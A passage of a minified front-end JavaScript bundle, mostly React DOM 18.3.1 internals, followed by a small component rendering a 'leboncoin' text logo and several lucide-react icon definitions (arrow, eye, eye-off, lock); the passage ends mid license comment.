function xc(e) {
    var t = e;
    do {
        var n = t.alternate;
        if (e = t.return,
        t.flags & 32768) {
            if (n = $f(n, t),
            n !== null) {
                n.flags &= 32767,
                X = n;
                return
            }
            if (e !== null)
                e.flags |= 32768,
                e.subtreeFlags = 0,
                e.deletions = null;
            else {
                J = 6,
                X = null;
                return
            }
        } else if (n = Bf(n, t, ke),
        n !== null) {
            X = n;
            return
        }
        if (t = t.sibling,
        t !== null) {
            X = t;
            return
        }
        X = t = e
    } while (t !== null);
    J === 0 && (J = 5)
}
function Mt(e, t, n) {
    var r = B
      , l = Le.transition;
    try {
        Le.transition = null,
        B = 1,
        qf(e, t, n, r)
    } finally {
        Le.transition = l,
        B = r
    }
    return null
}
function qf(e, t, n, r) {
    do
        pn();
    while (pt !== null);
    if (O & 6)
        throw Error(S(327));
    n = e.finishedWork;
    var l = e.finishedLanes;
    if (n === null)
        return null;
    if (e.finishedWork = null,
    e.finishedLanes = 0,
    n === e.current)
        throw Error(S(177));
    e.callbackNode = null,
    e.callbackPriority = 0;
    var o = n.lanes | n.childLanes;
    if (_d(e, o),
    e === ne && (X = ne = null,
    oe = 0),
    !(n.subtreeFlags & 2064) && !(n.flags & 2064) || Dr || (Dr = !0,
    Sc(el, function() {
        return pn(),
        null
    })),
    o = (n.flags & 15990) !== 0,
    n.subtreeFlags & 15990 || o) {
        o = Le.transition,
        Le.transition = null;
        var i = B;
        B = 1;
        var s = O;
        O |= 4,
        Wi.current = null,
        bf(e, n),
        pc(n, e),
        mf(Do),
        nl = !!Oo,
        Do = Oo = null,
        e.current = n,
        Vf(n),
        yd(),
        O = s,
        B = i,
        Le.transition = o
    } else
        e.current = n;
    if (Dr && (Dr = !1,
    pt = e,
    yl = l),
    o = e.pendingLanes,
    o === 0 && (xt = null),
    kd(n.stateNode),
    we(e, K()),
    t !== null)
        for (r = e.onRecoverableError,
        n = 0; n < t.length; n++)
            l = t[n],
            r(l.value, {
                componentStack: l.stack,
                digest: l.digest
            });
    if (vl)
        throw vl = !1,
        e = ni,
        ni = null,
        e;
    return yl & 1 && e.tag !== 0 && pn(),
    o = e.pendingLanes,
    o & 1 ? e === ri ? qn++ : (qn = 0,
    ri = e) : qn = 0,
    Et(),
    null
}
function pn() {
    if (pt !== null) {
        var e = Ju(yl)
          , t = Le.transition
          , n = B;
        try {
            if (Le.transition = null,
            B = 16 > e ? 16 : e,
            pt === null)
                var r = !1;
            else {
                if (e = pt,
                pt = null,
                yl = 0,
                O & 6)
                    throw Error(S(331));
                var l = O;
                for (O |= 4,
                _ = e.current; _ !== null; ) {
                    var o = _
                      , i = o.child;
                    if (_.flags & 16) {
                        var s = o.deletions;
                        if (s !== null) {
                            for (var a = 0; a < s.length; a++) {
                                var d = s[a];
                                for (_ = d; _ !== null; ) {
                                    var h = _;
                                    switch (h.tag) {
                                    case 0:
                                    case 11:
                                    case 15:
                                        Qn(8, h, o)
                                    }
                                    var g = h.child;
                                    if (g !== null)
                                        g.return = h,
                                        _ = g;
                                    else
                                        for (; _ !== null; ) {
                                            h = _;
                                            var m = h.sibling
                                              , x = h.return;
                                            if (cc(h),
                                            h === d) {
                                                _ = null;
                                                break
                                            }
                                            if (m !== null) {
                                                m.return = x,
                                                _ = m;
                                                break
                                            }
                                            _ = x
                                        }
                                }
                            }
                            var w = o.alternate;
                            if (w !== null) {
                                var v = w.child;
                                if (v !== null) {
                                    w.child = null;
                                    do {
                                        var N = v.sibling;
                                        v.sibling = null,
                                        v = N
                                    } while (v !== null)
                                }
                            }
                            _ = o
                        }
                    }
                    if (o.subtreeFlags & 2064 && i !== null)
                        i.return = o,
                        _ = i;
                    else
                        e: for (; _ !== null; ) {
                            if (o = _,
                            o.flags & 2048)
                                switch (o.tag) {
                                case 0:
                                case 11:
                                case 15:
                                    Qn(9, o, o.return)
                                }
                            var f = o.sibling;
                            if (f !== null) {
                                f.return = o.return,
                                _ = f;
                                break e
                            }
                            _ = o.return
                        }
                }
                var c = e.current;
                for (_ = c; _ !== null; ) {
                    i = _;
                    var p = i.child;
                    if (i.subtreeFlags & 2064 && p !== null)
                        p.return = i,
                        _ = p;
                    else
                        e: for (i = c; _ !== null; ) {
                            if (s = _,
                            s.flags & 2048)
                                try {
                                    switch (s.tag) {
                                    case 0:
                                    case 11:
                                    case 15:
                                        Ll(9, s)
                                    }
                                } catch (k) {
                                    q(s, s.return, k)
                                }
                            if (s === i) {
                                _ = null;
                                break e
                            }
                            var y = s.sibling;
                            if (y !== null) {
                                y.return = s.return,
                                _ = y;
                                break e
                            }
                            _ = s.return
                        }
                }
                if (O = l,
                Et(),
                We && typeof We.onPostCommitFiberRoot == "function")
                    try {
                        We.onPostCommitFiberRoot(Sl, e)
                    } catch {}
                r = !0
            }
            return r
        } finally {
            B = n,
            Le.transition = t
        }
    }
    return !1
}
function su(e, t, n) {
    t = wn(n, t),
    t = Ja(e, t, 1),
    e = yt(e, t, 1),
    t = pe(),
    e !== null && (pr(e, 1, t),
    we(e, t))
}
function q(e, t, n) {
    if (e.tag === 3)
        su(e, e, n);
    else
        for (; t !== null; ) {
            if (t.tag === 3) {
                su(t, e, n);
                break
            } else if (t.tag === 1) {
                var r = t.stateNode;
                if (typeof t.type.getDerivedStateFromError == "function" || typeof r.componentDidCatch == "function" && (xt === null || !xt.has(r))) {
                    e = wn(n, e),
                    e = ec(t, e, 1),
                    t = yt(t, e, 1),
                    e = pe(),
                    t !== null && (pr(t, 1, e),
                    we(t, e));
                    break
                }
            }
            t = t.return
        }
}
function Kf(e, t, n) {
    var r = e.pingCache;
    r !== null && r.delete(t),
    t = pe(),
    e.pingedLanes |= e.suspendedLanes & n,
    ne === e && (oe & n) === n && (J === 4 || J === 3 && (oe & 130023424) === oe && 500 > K() - Qi ? Dt(e, 0) : Hi |= n),
    we(e, t)
}
function wc(e, t) {
    t === 0 && (e.mode & 1 ? (t = Er,
    Er <<= 1,
    !(Er & 130023424) && (Er = 4194304)) : t = 1);
    var n = pe();
    e = et(e, t),
    e !== null && (pr(e, t, n),
    we(e, n))
}
function Yf(e) {
    var t = e.memoizedState
      , n = 0;
    t !== null && (n = t.retryLane),
    wc(e, n)
}
function Xf(e, t) {
    var n = 0;
    switch (e.tag) {
    case 13:
        var r = e.stateNode
          , l = e.memoizedState;
        l !== null && (n = l.retryLane);
        break;
    case 19:
        r = e.stateNode;
        break;
    default:
        throw Error(S(314))
    }
    r !== null && r.delete(t),
    wc(e, n)
}
var kc;
kc = function(e, t, n) {
    if (e !== null)
        if (e.memoizedProps !== t.pendingProps || ye.current)
            ve = !0;
        else {
            if (!(e.lanes & n) && !(t.flags & 128))
                return ve = !1,
                Ff(e, t, n);
            ve = !!(e.flags & 131072)
        }
    else
        ve = !1,
        W && t.flags & 1048576 && Ca(t, al, t.index);
    switch (t.lanes = 0,
    t.tag) {
    case 2:
        var r = t.type;
        Gr(e, t),
        e = t.pendingProps;
        var l = gn(t, de.current);
        fn(t, n),
        l = Bi(null, t, r, e, l, n);
        var o = $i();
        return t.flags |= 1,
        typeof l == "object" && l !== null && typeof l.render == "function" && l.$$typeof === void 0 ? (t.tag = 1,
        t.memoizedState = null,
        t.updateQueue = null,
        xe(r) ? (o = !0,
        sl(t)) : o = !1,
        t.memoizedState = l.state !== null && l.state !== void 0 ? l.state : null,
        Ii(t),
        l.updater = Pl,
        t.stateNode = l,
        l._reactInternals = t,
        Ho(t, r, e, n),
        t = qo(null, t, r, !0, o, n)) : (t.tag = 0,
        W && o && _i(t),
        fe(null, t, l, n),
        t = t.child),
        t;
    case 16:
        r = t.elementType;
        e: {
            switch (Gr(e, t),
            e = t.pendingProps,
            l = r._init,
            r = l(r._payload),
            t.type = r,
            l = t.tag = Jf(r),
            e = Oe(r, e),
            l) {
            case 0:
                t = Go(null, t, r, e, n);
                break e;
            case 1:
                t = Xs(null, t, r, e, n);
                break e;
            case 11:
                t = Ks(null, t, r, e, n);
                break e;
            case 14:
                t = Ys(null, t, r, Oe(r.type, e), n);
                break e
            }
            throw Error(S(306, r, ""))
        }
        return t;
    case 0:
        return r = t.type,
        l = t.pendingProps,
        l = t.elementType === r ? l : Oe(r, l),
        Go(e, t, r, l, n);
    case 1:
        return r = t.type,
        l = t.pendingProps,
        l = t.elementType === r ? l : Oe(r, l),
        Xs(e, t, r, l, n);
    case 3:
        e: {
            if (lc(t),
            e === null)
                throw Error(S(387));
            r = t.pendingProps,
            o = t.memoizedState,
            l = o.element,
            Ta(e, t),
            fl(t, r, null, n);
            var i = t.memoizedState;
            if (r = i.element,
            o.isDehydrated)
                if (o = {
                    element: r,
                    isDehydrated: !1,
                    cache: i.cache,
                    pendingSuspenseBoundaries: i.pendingSuspenseBoundaries,
                    transitions: i.transitions
                },
                t.updateQueue.baseState = o,
                t.memoizedState = o,
                t.flags & 256) {
                    l = wn(Error(S(423)), t),
                    t = Zs(e, t, r, n, l);
                    break e
                } else if (r !== l) {
                    l = wn(Error(S(424)), t),
                    t = Zs(e, t, r, n, l);
                    break e
                } else
                    for (Se = vt(t.stateNode.containerInfo.firstChild),
                    Ne = t,
                    W = !0,
                    Ae = null,
                    n = Pa(t, null, r, n),
                    t.child = n; n; )
                        n.flags = n.flags & -3 | 4096,
                        n = n.sibling;
            else {
                if (vn(),
                r === l) {
                    t = tt(e, t, n);
                    break e
                }
                fe(e, t, r, n)
            }
            t = t.child
        }
        return t;
    case 5:
        return Ma(t),
        e === null && bo(t),
        r = t.type,
        l = t.pendingProps,
        o = e !== null ? e.memoizedProps : null,
        i = l.children,
        Ao(r, l) ? i = null : o !== null && Ao(r, o) && (t.flags |= 32),
        rc(e, t),
        fe(e, t, i, n),
        t.child;
    case 6:
        return e === null && bo(t),
        null;
    case 13:
        return oc(e, t, n);
    case 4:
        return Oi(t, t.stateNode.containerInfo),
        r = t.pendingProps,
        e === null ? t.child = yn(t, null, r, n) : fe(e, t, r, n),
        t.child;
    case 11:
        return r = t.type,
        l = t.pendingProps,
        l = t.elementType === r ? l : Oe(r, l),
        Ks(e, t, r, l, n);
    case 7:
        return fe(e, t, t.pendingProps, n),
        t.child;
    case 8:
        return fe(e, t, t.pendingProps.children, n),
        t.child;
    case 12:
        return fe(e, t, t.pendingProps.children, n),
        t.child;
    case 10:
        e: {
            if (r = t.type._context,
            l = t.pendingProps,
            o = t.memoizedProps,
            i = l.value,
            $(cl, r._currentValue),
            r._currentValue = i,
            o !== null)
                if ($e(o.value, i)) {
                    if (o.children === l.children && !ye.current) {
                        t = tt(e, t, n);
                        break e
                    }
                } else
                    for (o = t.child,
                    o !== null && (o.return = t); o !== null; ) {
                        var s = o.dependencies;
                        if (s !== null) {
                            i = o.child;
                            for (var a = s.firstContext; a !== null; ) {
                                if (a.context === r) {
                                    if (o.tag === 1) {
                                        a = Xe(-1, n & -n),
                                        a.tag = 2;
                                        var d = o.updateQueue;
                                        if (d !== null) {
                                            d = d.shared;
                                            var h = d.pending;
                                            h === null ? a.next = a : (a.next = h.next,
                                            h.next = a),
                                            d.pending = a
                                        }
                                    }
                                    o.lanes |= n,
                                    a = o.alternate,
                                    a !== null && (a.lanes |= n),
                                    Vo(o.return, n, t),
                                    s.lanes |= n;
                                    break
                                }
                                a = a.next
                            }
                        } else if (o.tag === 10)
                            i = o.type === t.type ? null : o.child;
                        else if (o.tag === 18) {
                            if (i = o.return,
                            i === null)
                                throw Error(S(341));
                            i.lanes |= n,
                            s = i.alternate,
                            s !== null && (s.lanes |= n),
                            Vo(i, n, t),
                            i = o.sibling
                        } else
                            i = o.child;
                        if (i !== null)
                            i.return = o;
                        else
                            for (i = o; i !== null; ) {
                                if (i === t) {
                                    i = null;
                                    break
                                }
                                if (o = i.sibling,
                                o !== null) {
                                    o.return = i.return,
                                    i = o;
                                    break
                                }
                                i = i.return
                            }
                        o = i
                    }
            fe(e, t, l.children, n),
            t = t.child
        }
        return t;
    case 9:
        return l = t.type,
        r = t.pendingProps.children,
        fn(t, n),
        l = Te(l),
        r = r(l),
        t.flags |= 1,
        fe(e, t, r, n),
        t.child;
    case 14:
        return r = t.type,
        l = Oe(r, t.pendingProps),
        l = Oe(r.type, l),
        Ys(e, t, r, l, n);
    case 15:
        return tc(e, t, t.type, t.pendingProps, n);
    case 17:
        return r = t.type,
        l = t.pendingProps,
        l = t.elementType === r ? l : Oe(r, l),
        Gr(e, t),
        t.tag = 1,
        xe(r) ? (e = !0,
        sl(t)) : e = !1,
        fn(t, n),
        Za(t, r, l),
        Ho(t, r, l, n),
        qo(null, t, r, !0, e, n);
    case 19:
        return ic(e, t, n);
    case 22:
        return nc(e, t, n)
    }
    throw Error(S(156, t.tag))
}
;
function Sc(e, t) {
    return Ku(e, t)
}
function Zf(e, t, n, r) {
    this.tag = e,
    this.key = n,
    this.sibling = this.child = this.return = this.stateNode = this.type = this.elementType = null,
    this.index = 0,
    this.ref = null,
    this.pendingProps = t,
    this.dependencies = this.memoizedState = this.updateQueue = this.memoizedProps = null,
    this.mode = r,
    this.subtreeFlags = this.flags = 0,
    this.deletions = null,
    this.childLanes = this.lanes = 0,
    this.alternate = null
}
function Pe(e, t, n, r) {
    return new Zf(e,t,n,r)
}
function Yi(e) {
    return e = e.prototype,
    !(!e || !e.isReactComponent)
}
function Jf(e) {
    if (typeof e == "function")
        return Yi(e) ? 1 : 0;
    if (e != null) {
        if (e = e.$$typeof,
        e === hi)
            return 11;
        if (e === gi)
            return 14
    }
    return 2
}
function kt(e, t) {
    var n = e.alternate;
    return n === null ? (n = Pe(e.tag, t, e.key, e.mode),
    n.elementType = e.elementType,
    n.type = e.type,
    n.stateNode = e.stateNode,
    n.alternate = e,
    e.alternate = n) : (n.pendingProps = t,
    n.type = e.type,
    n.flags = 0,
    n.subtreeFlags = 0,
    n.deletions = null),
    n.flags = e.flags & 14680064,
    n.childLanes = e.childLanes,
    n.lanes = e.lanes,
    n.child = e.child,
    n.memoizedProps = e.memoizedProps,
    n.memoizedState = e.memoizedState,
    n.updateQueue = e.updateQueue,
    t = e.dependencies,
    n.dependencies = t === null ? null : {
        lanes: t.lanes,
        firstContext: t.firstContext
    },
    n.sibling = e.sibling,
    n.index = e.index,
    n.ref = e.ref,
    n
}
function Yr(e, t, n, r, l, o) {
    var i = 2;
    if (r = e,
    typeof e == "function")
        Yi(e) && (i = 1);
    else if (typeof e == "string")
        i = 5;
    else
        e: switch (e) {
        case Yt:
            return At(n.children, l, o, t);
        case mi:
            i = 8,
            l |= 8;
            break;
        case ho:
            return e = Pe(12, n, t, l | 2),
            e.elementType = ho,
            e.lanes = o,
            e;
        case go:
            return e = Pe(13, n, t, l),
            e.elementType = go,
            e.lanes = o,
            e;
        case vo:
            return e = Pe(19, n, t, l),
            e.elementType = vo,
            e.lanes = o,
            e;
        case Mu:
            return Ml(n, l, o, t);
        default:
            if (typeof e == "object" && e !== null)
                switch (e.$$typeof) {
                case Lu:
                    i = 10;
                    break e;
                case Tu:
                    i = 9;
                    break e;
                case hi:
                    i = 11;
                    break e;
                case gi:
                    i = 14;
                    break e;
                case ut:
                    i = 16,
                    r = null;
                    break e
                }
            throw Error(S(130, e == null ? e : typeof e, ""))
        }
    return t = Pe(i, n, t, l),
    t.elementType = e,
    t.type = r,
    t.lanes = o,
    t
}
function At(e, t, n, r) {
    return e = Pe(7, e, r, t),
    e.lanes = n,
    e
}
function Ml(e, t, n, r) {
    return e = Pe(22, e, r, t),
    e.elementType = Mu,
    e.lanes = n,
    e.stateNode = {
        isHidden: !1
    },
    e
}
function co(e, t, n) {
    return e = Pe(6, e, null, t),
    e.lanes = n,
    e
}
function fo(e, t, n) {
    return t = Pe(4, e.children !== null ? e.children : [], e.key, t),
    t.lanes = n,
    t.stateNode = {
        containerInfo: e.containerInfo,
        pendingChildren: null,
        implementation: e.implementation
    },
    t
}
function ep(e, t, n, r, l) {
    this.tag = t,
    this.containerInfo = e,
    this.finishedWork = this.pingCache = this.current = this.pendingChildren = null,
    this.timeoutHandle = -1,
    this.callbackNode = this.pendingContext = this.context = null,
    this.callbackPriority = 0,
    this.eventTimes = Hl(0),
    this.expirationTimes = Hl(-1),
    this.entangledLanes = this.finishedLanes = this.mutableReadLanes = this.expiredLanes = this.pingedLanes = this.suspendedLanes = this.pendingLanes = 0,
    this.entanglements = Hl(0),
    this.identifierPrefix = r,
    this.onRecoverableError = l,
    this.mutableSourceEagerHydrationData = null
}
function Xi(e, t, n, r, l, o, i, s, a) {
    return e = new ep(e,t,n,s,a),
    t === 1 ? (t = 1,
    o === !0 && (t |= 8)) : t = 0,
    o = Pe(3, null, null, t),
    e.current = o,
    o.stateNode = e,
    o.memoizedState = {
        element: r,
        isDehydrated: n,
        cache: null,
        transitions: null,
        pendingSuspenseBoundaries: null
    },
    Ii(o),
    e
}
function tp(e, t, n) {
    var r = 3 < arguments.length && arguments[3] !== void 0 ? arguments[3] : null;
    return {
        $$typeof: Kt,
        key: r == null ? null : "" + r,
        children: e,
        containerInfo: t,
        implementation: n
    }
}
function Nc(e) {
    if (!e)
        return Nt;
    e = e._reactInternals;
    e: {
        if (Wt(e) !== e || e.tag !== 1)
            throw Error(S(170));
        var t = e;
        do {
            switch (t.tag) {
            case 3:
                t = t.stateNode.context;
                break e;
            case 1:
                if (xe(t.type)) {
                    t = t.stateNode.__reactInternalMemoizedMergedChildContext;
                    break e
                }
            }
            t = t.return
        } while (t !== null);
        throw Error(S(171))
    }
    if (e.tag === 1) {
        var n = e.type;
        if (xe(n))
            return Na(e, n, t)
    }
    return t
}
function jc(e, t, n, r, l, o, i, s, a) {
    return e = Xi(n, r, !0, e, l, o, i, s, a),
    e.context = Nc(null),
    n = e.current,
    r = pe(),
    l = wt(n),
    o = Xe(r, l),
    o.callback = t ?? null,
    yt(n, o, l),
    e.current.lanes = l,
    pr(e, l, r),
    we(e, r),
    e
}
function Rl(e, t, n, r) {
    var l = t.current
      , o = pe()
      , i = wt(l);
    return n = Nc(n),
    t.context === null ? t.context = n : t.pendingContext = n,
    t = Xe(o, i),
    t.payload = {
        element: e
    },
    r = r === void 0 ? null : r,
    r !== null && (t.callback = r),
    e = yt(l, t, i),
    e !== null && (Be(e, l, i, o),
    Wr(e, l, i)),
    i
}
function wl(e) {
    if (e = e.current,
    !e.child)
        return null;
    switch (e.child.tag) {
    case 5:
        return e.child.stateNode;
    default:
        return e.child.stateNode
    }
}
function uu(e, t) {
    if (e = e.memoizedState,
    e !== null && e.dehydrated !== null) {
        var n = e.retryLane;
        e.retryLane = n !== 0 && n < t ? n : t
    }
}
function Zi(e, t) {
    uu(e, t),
    (e = e.alternate) && uu(e, t)
}
function np() {
    return null
}
var Cc = typeof reportError == "function" ? reportError : function(e) {
    console.error(e)
}
;
function Ji(e) {
    this._internalRoot = e
}
Il.prototype.render = Ji.prototype.render = function(e) {
    var t = this._internalRoot;
    if (t === null)
        throw Error(S(409));
    Rl(e, t, null, null)
}
;
Il.prototype.unmount = Ji.prototype.unmount = function() {
    var e = this._internalRoot;
    if (e !== null) {
        this._internalRoot = null;
        var t = e.containerInfo;
        bt(function() {
            Rl(null, e, null, null)
        }),
        t[Je] = null
    }
}
;
function Il(e) {
    this._internalRoot = e
}
Il.prototype.unstable_scheduleHydration = function(e) {
    if (e) {
        var t = na();
        e = {
            blockedOn: null,
            target: e,
            priority: t
        };
        for (var n = 0; n < ct.length && t !== 0 && t < ct[n].priority; n++)
            ;
        ct.splice(n, 0, e),
        n === 0 && la(e)
    }
}
;
function es(e) {
    return !(!e || e.nodeType !== 1 && e.nodeType !== 9 && e.nodeType !== 11)
}
function Ol(e) {
    return !(!e || e.nodeType !== 1 && e.nodeType !== 9 && e.nodeType !== 11 && (e.nodeType !== 8 || e.nodeValue !== " react-mount-point-unstable "))
}
function au() {}
function rp(e, t, n, r, l) {
    if (l) {
        if (typeof r == "function") {
            var o = r;
            r = function() {
                var d = wl(i);
                o.call(d)
            }
        }
        var i = jc(t, r, e, 0, null, !1, !1, "", au);
        return e._reactRootContainer = i,
        e[Je] = i.current,
        rr(e.nodeType === 8 ? e.parentNode : e),
        bt(),
        i
    }
    for (; l = e.lastChild; )
        e.removeChild(l);
    if (typeof r == "function") {
        var s = r;
        r = function() {
            var d = wl(a);
            s.call(d)
        }
    }
    var a = Xi(e, 0, !1, null, null, !1, !1, "", au);
    return e._reactRootContainer = a,
    e[Je] = a.current,
    rr(e.nodeType === 8 ? e.parentNode : e),
    bt(function() {
        Rl(t, a, n, r)
    }),
    a
}
function Dl(e, t, n, r, l) {
    var o = n._reactRootContainer;
    if (o) {
        var i = o;
        if (typeof l == "function") {
            var s = l;
            l = function() {
                var a = wl(i);
                s.call(a)
            }
        }
        Rl(t, i, e, l)
    } else
        i = rp(n, t, e, l, r);
    return wl(i)
}
ea = function(e) {
    switch (e.tag) {
    case 3:
        var t = e.stateNode;
        if (t.current.memoizedState.isDehydrated) {
            var n = Fn(t.pendingLanes);
            n !== 0 && (xi(t, n | 1),
            we(t, K()),
            !(O & 6) && (kn = K() + 500,
            Et()))
        }
        break;
    case 13:
        bt(function() {
            var r = et(e, 1);
            if (r !== null) {
                var l = pe();
                Be(r, e, 1, l)
            }
        }),
        Zi(e, 1)
    }
}
;
wi = function(e) {
    if (e.tag === 13) {
        var t = et(e, 134217728);
        if (t !== null) {
            var n = pe();
            Be(t, e, 134217728, n)
        }
        Zi(e, 134217728)
    }
}
;
ta = function(e) {
    if (e.tag === 13) {
        var t = wt(e)
          , n = et(e, t);
        if (n !== null) {
            var r = pe();
            Be(n, e, t, r)
        }
        Zi(e, t)
    }
}
;
na = function() {
    return B
}
;
ra = function(e, t) {
    var n = B;
    try {
        return B = e,
        t()
    } finally {
        B = n
    }
}
;
_o = function(e, t, n) {
    switch (t) {
    case "input":
        if (wo(e, n),
        t = n.name,
        n.type === "radio" && t != null) {
            for (n = e; n.parentNode; )
                n = n.parentNode;
            for (n = n.querySelectorAll("input[name=" + JSON.stringify("" + t) + '][type="radio"]'),
            t = 0; t < n.length; t++) {
                var r = n[t];
                if (r !== e && r.form === e.form) {
                    var l = El(r);
                    if (!l)
                        throw Error(S(90));
                    Iu(r),
                    wo(r, l)
                }
            }
        }
        break;
    case "textarea":
        Du(e, n);
        break;
    case "select":
        t = n.value,
        t != null && un(e, !!n.multiple, t, !1)
    }
}
;
Vu = Gi;
Wu = bt;
var lp = {
    usingClientEntryPoint: !1,
    Events: [hr, en, El, Uu, bu, Gi]
}
  , Rn = {
    findFiberByHostInstance: Rt,
    bundleType: 0,
    version: "18.3.1",
    rendererPackageName: "react-dom"
}
  , op = {
    bundleType: Rn.bundleType,
    version: Rn.version,
    rendererPackageName: Rn.rendererPackageName,
    rendererConfig: Rn.rendererConfig,
    overrideHookState: null,
    overrideHookStateDeletePath: null,
    overrideHookStateRenamePath: null,
    overrideProps: null,
    overridePropsDeletePath: null,
    overridePropsRenamePath: null,
    setErrorHandler: null,
    setSuspenseHandler: null,
    scheduleUpdate: null,
    currentDispatcherRef: rt.ReactCurrentDispatcher,
    findHostInstanceByFiber: function(e) {
        return e = Gu(e),
        e === null ? null : e.stateNode
    },
    findFiberByHostInstance: Rn.findFiberByHostInstance || np,
    findHostInstancesForRefresh: null,
    scheduleRefresh: null,
    scheduleRoot: null,
    setRefreshHandler: null,
    getCurrentFiber: null,
    reconcilerVersion: "18.3.1-next-f1338f8080-20240426"
};
if (typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ < "u") {
    var Ar = __REACT_DEVTOOLS_GLOBAL_HOOK__;
    if (!Ar.isDisabled && Ar.supportsFiber)
        try {
            Sl = Ar.inject(op),
            We = Ar
        } catch {}
}
Ce.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED = lp;
Ce.createPortal = function(e, t) {
    var n = 2 < arguments.length && arguments[2] !== void 0 ? arguments[2] : null;
    if (!es(t))
        throw Error(S(200));
    return tp(e, t, null, n)
}
;
Ce.createRoot = function(e, t) {
    if (!es(e))
        throw Error(S(299));
    var n = !1
      , r = ""
      , l = Cc;
    return t != null && (t.unstable_strictMode === !0 && (n = !0),
    t.identifierPrefix !== void 0 && (r = t.identifierPrefix),
    t.onRecoverableError !== void 0 && (l = t.onRecoverableError)),
    t = Xi(e, 1, !1, null, null, n, !1, r, l),
    e[Je] = t.current,
    rr(e.nodeType === 8 ? e.parentNode : e),
    new Ji(t)
}
;
Ce.findDOMNode = function(e) {
    if (e == null)
        return null;
    if (e.nodeType === 1)
        return e;
    var t = e._reactInternals;
    if (t === void 0)
        throw typeof e.render == "function" ? Error(S(188)) : (e = Object.keys(e).join(","),
        Error(S(268, e)));
    return e = Gu(t),
    e = e === null ? null : e.stateNode,
    e
}
;
Ce.flushSync = function(e) {
    return bt(e)
}
;
Ce.hydrate = function(e, t, n) {
    if (!Ol(t))
        throw Error(S(200));
    return Dl(null, e, t, !0, n)
}
;
Ce.hydrateRoot = function(e, t, n) {
    if (!es(e))
        throw Error(S(405));
    var r = n != null && n.hydratedSources || null
      , l = !1
      , o = ""
      , i = Cc;
    if (n != null && (n.unstable_strictMode === !0 && (l = !0),
    n.identifierPrefix !== void 0 && (o = n.identifierPrefix),
    n.onRecoverableError !== void 0 && (i = n.onRecoverableError)),
    t = jc(t, null, e, 1, n ?? null, l, !1, o, i),
    e[Je] = t.current,
    rr(e),
    r)
        for (e = 0; e < r.length; e++)
            n = r[e],
            l = n._getVersion,
            l = l(n._source),
            t.mutableSourceEagerHydrationData == null ? t.mutableSourceEagerHydrationData = [n, l] : t.mutableSourceEagerHydrationData.push(n, l);
    return new Il(t)
}
;
Ce.render = function(e, t, n) {
    if (!Ol(t))
        throw Error(S(200));
    return Dl(null, e, t, !1, n)
}
;
Ce.unmountComponentAtNode = function(e) {
    if (!Ol(e))
        throw Error(S(40));
    return e._reactRootContainer ? (bt(function() {
        Dl(null, null, e, !1, function() {
            e._reactRootContainer = null,
            e[Je] = null
        })
    }),
    !0) : !1
}
;
Ce.unstable_batchedUpdates = Gi;
Ce.unstable_renderSubtreeIntoContainer = function(e, t, n, r) {
    if (!Ol(n))
        throw Error(S(200));
    if (e == null || e._reactInternals === void 0)
        throw Error(S(38));
    return Dl(e, t, n, !1, r)
}
;
Ce.version = "18.3.1-next-f1338f8080-20240426";
function Ec() {
    if (!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ > "u" || typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE != "function"))
        try {
            __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(Ec)
        } catch (e) {
            console.error(e)
        }
}
Ec(),
Eu.exports = Ce;
var ip = Eu.exports, _c, cu = ip;
_c = cu.createRoot,
cu.hydrateRoot;
const _t = () => u.jsx("div", {
    className: "text-leboncoin font-bold text-2xl md:text-3xl",
    children: "leboncoin"
});
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
var sp = {
    xmlns: "http://www.w3.org/2000/svg",
    width: 24,
    height: 24,
    viewBox: "0 0 24 24",
    fill: "none",
    stroke: "currentColor",
    strokeWidth: 2,
    strokeLinecap: "round",
    strokeLinejoin: "round"
};
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const up = e => e.replace(/([a-z0-9])([A-Z])/g, "$1-$2").toLowerCase().trim()
  , vr = (e, t) => {
    const n = R.forwardRef( ({color: r="currentColor", size: l=24, strokeWidth: o=2, absoluteStrokeWidth: i, className: s="", children: a, ...d}, h) => R.createElement("svg", {
        ref: h,
        ...sp,
        width: l,
        height: l,
        stroke: r,
        strokeWidth: i ? Number(o) * 24 / Number(l) : o,
        className: ["lucide", `lucide-${up(e)}`, s].join(" "),
        ...d
    }, [...t.map( ([g,m]) => R.createElement(g, m)), ...Array.isArray(a) ? a : [a]]));
    return n.displayName = `${e}`,
    n
}
;
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const ap = vr("ArrowLeft", [["path", {
    d: "m12 19-7-7 7-7",
    key: "1l729n"
}], ["path", {
    d: "M19 12H5",
    key: "x3x0zl"
}]]);
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const cp = vr("EyeOff", [["path", {
    d: "M9.88 9.88a3 3 0 1 0 4.24 4.24",
    key: "1jxqfv"
}], ["path", {
    d: "M10.73 5.08A10.43 10.43 0 0 1 12 5c7 0 10 7 10 7a13.16 13.16 0 0 1-1.67 2.68",
    key: "9wicm4"
}], ["path", {
    d: "M6.61 6.61A13.526 13.526 0 0 0 2 12s3 7 10 7a9.74 9.74 0 0 0 5.39-1.61",
    key: "1jreej"
}], ["line", {
    x1: "2",
    x2: "22",
    y1: "2",
    y2: "22",
    key: "a6p6uj"
}]]);
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const dp = vr("Eye", [["path", {
    d: "M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7Z",
    key: "rwhkz3"
}], ["circle", {
    cx: "12",
    cy: "12",
    r: "3",
    key: "1v7zrd"
}]]);
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const fp = vr("Lock", [["rect", {
    width: "18",
    height: "11",
    x: "3",
    y: "11",
    rx: "2",
    ry: "2",
    key: "1w4ew1"
}], ["path", {
    d: "M7 11V7a5 5 0 0 1 10 0v4",
    key: "fwvmzm"
}]]);
/**
 * @license lucide-react v0.344.0 - ISC
 *
